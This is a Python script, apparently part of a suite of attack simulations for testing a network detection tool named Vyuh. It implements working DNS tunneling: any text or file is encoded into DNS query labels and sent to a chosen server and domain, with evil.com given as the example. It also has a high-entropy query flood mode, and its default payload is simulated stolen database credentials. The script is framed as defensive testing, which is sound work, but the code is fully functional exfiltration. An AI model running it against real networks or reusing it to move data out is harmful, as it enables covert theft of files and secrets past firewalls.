"""
03_dns_tunneling.py — DNS Tunneling Attack Simulation
=====================================================
Simulates DNS tunneling: encodes arbitrary data (text/file payload)
into DNS query labels and sends them to a controlled DNS server.

Real DNS tunneling tools (iodine, dnscat2) use this technique to
exfiltrate data or create covert C2 channels through firewalls.

Vyuh should detect:
  - Unusually long DNS query names
  - High query frequency to a single domain
  - High entropy in query subdomains

Usage:
    python 03_dns_tunneling.py
    python 03_dns_tunneling.py --data "Hello World" --domain evil.com
    python 03_dns_tunneling.py --file secret.txt
"""

import socket
import base64
import struct
import time
import argparse
import logging
import random
import string
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
import config

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(config.LOG_FILE, mode="a"),
    ]
)
log = logging.getLogger("dns_tunneling")

BANNER = """
╔══════════════════════════════════════════════════╗
║    Vyuh Attack Sim — 03 DNS TUNNELING            ║
╚══════════════════════════════════════════════════╝
"""

# ── DNS Packet Builder ────────────────────────────────────────────────────────
def build_dns_query(fqdn: str, qtype: int = 1) -> bytes:
    """
    Build a raw DNS query packet for `fqdn`.
    qtype: 1=A, 16=TXT, 28=AAAA
    """
    transaction_id = random.randint(0, 65535)
    flags          = 0x0100          # Standard query, recursion desired
    qdcount        = 1
    ancount        = 0
    nscount        = 0
    arcount        = 0

    header = struct.pack(">HHHHHH",
                         transaction_id, flags,
                         qdcount, ancount, nscount, arcount)

    # Encode FQDN into DNS wire format labels
    question = b""
    for part in fqdn.split("."):
        encoded = part.encode("ascii")
        question += bytes([len(encoded)]) + encoded
    question += b"\x00"                     # root label
    question += struct.pack(">HH", qtype, 1)  # QTYPE, QCLASS=IN

    return header + question


def send_dns_query(server: str, port: int, fqdn: str,
                   qtype: int = 16) -> tuple[bool, bytes]:
    """Send a raw DNS query and return (success, raw_response)."""
    try:
        packet = build_dns_query(fqdn, qtype)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3.0)
            s.sendto(packet, (server, port))
            resp = s.recv(4096)
            return True, resp
    except Exception as e:
        return False, str(e).encode()


# ── Encoding helpers ──────────────────────────────────────────────────────────
def encode_chunk_base32(data: bytes) -> str:
    """Base32 encode a chunk (DNS-safe: no padding, lowercase)."""
    return base64.b32encode(data).decode().lower().rstrip("=")


def encode_chunk_hex(data: bytes) -> str:
    """Hex encode a chunk."""
    return data.hex()


def split_into_labels(encoded: str, max_label: int = 60) -> list[str]:
    """
    Split a long encoded string into DNS label-sized chunks.
    DNS labels max 63 chars. We use 60 to be safe.
    """
    return [encoded[i:i + max_label] for i in range(0, len(encoded), max_label)]


# ── DNS Tunnel Data Exfil ─────────────────────────────────────────────────────
def tunnel_data_via_dns(payload: bytes, dns_server: str, dns_port: int,
                         base_domain: str, chunk_size: int = 30,
                         delay: float = 0.5, encoding: str = "base32"):
    """
    Encode payload in chunks, embed each chunk as a subdomain label,
    and send it as DNS queries.

    Query format: <seq>.<encoded_chunk>.<base_domain>
    Example:      0001.jbswy3dpehpk3pxp.tunnel.evil.com
    """
    total_bytes = len(payload)
    chunks      = [payload[i:i + chunk_size]
                   for i in range(0, total_bytes, chunk_size)]
    total_chunks = len(chunks)

    log.info(f"[*] DNS Tunneling — {total_bytes} bytes in {total_chunks} chunks")
    log.info(f"[*] Server: {dns_server}:{dns_port} | Domain: {base_domain}")
    log.info(f"[*] Encoding: {encoding.upper()} | Chunk size: {chunk_size}B")

    print(f"\n  Tunneling {total_bytes} bytes across {total_chunks} DNS queries")
    print(f"  {'#':<5} {'FQDN':<65} {'STATUS'}")
    print(f"  {'-'*5} {'-'*65} {'-'*10}")

    sent = 0
    failed = 0

    for i, chunk in enumerate(chunks):
        # Encode
        if encoding == "base32":
            enc = encode_chunk_base32(chunk)
        else:
            enc = encode_chunk_hex(chunk)

        # Build FQDN: seq_hex.encoded.base_domain
        seq_hex = f"{i:04x}"
        labels  = split_into_labels(enc, 60)

        # Flatten labels into subdomain path
        subdomain = ".".join(labels)
        fqdn      = f"{seq_hex}.{subdomain}.{base_domain}"

        # Truncate display for readability
        fqdn_display = fqdn if len(fqdn) <= 64 else fqdn[:61] + "..."

        ok, resp = send_dns_query(dns_server, dns_port, fqdn, qtype=16)
        status = "✅ sent" if ok else "❌ failed"
        if ok:
            sent += 1
        else:
            failed += 1

        log.info(f"DNS tunnel chunk [{i}/{total_chunks}]: {fqdn_display} -> {status}")
        print(f"  {i:<5} {fqdn_display:<65} {status}")
        time.sleep(delay)

    return sent, failed


# ── High-frequency DNS flood (volume-based tunneling indicator) ───────────────
def dns_query_flood(dns_server: str, dns_port: int,
                     base_domain: str, count: int = 50, delay: float = 0.1):
    """
    Send many high-entropy DNS queries in rapid succession.
    Even without actual data, this mimics the *pattern* of DNS tunneling
    (high query rate + high entropy labels) which Vyuh should flag.
    """
    log.info(f"[*] DNS query flood: {count} queries to {dns_server}")
    print(f"\n  Sending {count} high-entropy DNS queries (flood mode)...")

    def random_label(length: int = 32) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    for i in range(count):
        label = random_label(random.randint(20, 60))
        fqdn  = f"{label}.{base_domain}"
        ok, _ = send_dns_query(dns_server, dns_port, fqdn, qtype=1)
        status = "✅" if ok else "❌"
        print(f"\r  [{status}] Query {i+1}/{count}: {fqdn[:60]}...", end="", flush=True)
        time.sleep(delay)
    print()


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="DNS Tunneling Simulation — Vyuh")
    parser.add_argument("--server",   default=config.DNS_SERVER,  help="DNS server IP")
    parser.add_argument("--port",     default=config.DNS_PORT,    type=int, help="DNS port")
    parser.add_argument("--domain",   default=config.DNS_DOMAIN,  help="Base domain")
    parser.add_argument("--data",     default=None,               help="Payload string to tunnel")
    parser.add_argument("--file",     default=None,               help="File to tunnel")
    parser.add_argument("--chunk",    default=30, type=int,       help="Chunk size (bytes)")
    parser.add_argument("--delay",    default=0.5, type=float,    help="Delay between queries (s)")
    parser.add_argument("--encoding", default="base32",
                        choices=["base32", "hex"],                help="Encoding scheme")
    parser.add_argument("--flood",    action="store_true",        help="Run high-frequency query flood")
    parser.add_argument("--flood-count", default=50, type=int,   help="Number of flood queries")
    args = parser.parse_args()

    log.info(f"=== DNS Tunneling simulation started ===")
    print(f"  DNS Server : {args.server}:{args.port}")
    print(f"  Domain     : {args.domain}")
    print(f"  Mode       : {'Flood' if args.flood else 'Data Tunnel'}")

    if args.flood:
        dns_query_flood(args.server, args.port, args.domain,
                        args.flood_count, args.delay)
    else:
        # Determine payload
        if args.file and os.path.isfile(args.file):
            with open(args.file, "rb") as f:
                payload = f.read()
            log.info(f"Loaded file payload: {args.file} ({len(payload)} bytes)")
        elif args.data:
            payload = args.data.encode()
        else:
            # Default demo payload — simulate exfiltrated credentials
            payload = (
                b"EXFIL|user=admin|pass=S3cr3t!|host=192.168.1.50|"
                b"db=prod_customers|rows=14332|ts=2026-10-23T14:00:00Z"
            )
            log.info("Using default demo payload (simulated credential theft)")

        print(f"  Payload    : {len(payload)} bytes")
        print(f"  Encoding   : {args.encoding.upper()}")

        sent, failed = tunnel_data_via_dns(
            payload, args.server, args.port,
            args.domain, args.chunk, args.delay, args.encoding
        )

        print("\n" + "═" * 52)
        print("  DNS TUNNELING SUMMARY")
        print("═" * 52)
        print(f"  Payload size   : {len(payload)} bytes")
        print(f"  Queries sent   : {sent}")
        print(f"  Failed queries : {failed}")
        print(f"  Success rate   : {(sent/(sent+failed)*100) if (sent+failed)>0 else 0:.1f}%")
        print("═" * 52)
        log.info(f"DNS tunneling complete: {sent} sent, {failed} failed")


if __name__ == "__main__":
    main()
